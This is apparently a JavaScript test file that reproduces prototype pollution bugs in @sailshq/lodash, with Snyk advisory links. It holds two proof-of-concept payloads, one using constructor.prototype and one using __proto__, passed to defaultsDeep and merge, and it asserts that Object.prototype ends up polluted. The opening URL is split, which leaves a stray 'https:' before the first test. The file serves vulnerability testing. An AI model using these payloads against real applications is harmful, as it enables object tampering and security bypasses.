//security.snyk.io/vuln/SNYK-JS-SAILSHQLODASH-460129
https: test("prototype pollution in @sailshq/lodash.defaultsDeep", () => {
  expect({}.polluted).toBe(undefined);
  const mergeFn = require("lodash").defaultsDeep;
  const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
  mergeFn({}, JSON.parse(payload));
  expect({}.polluted).toBe("yes");
});

// //https://security.snyk.io/vuln/SNYK-JS-SAILSHQLODASH-460130
// test("prototype pollution in @sailshq/lodash", () => {
//   expect({}.polluted).toBe(undefined);

//   var _= require('lodash');
//   var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
//   _.merge({}, JSON.parse(malicious_payload));
//   expect({}.polluted).toBe("yes");
// });
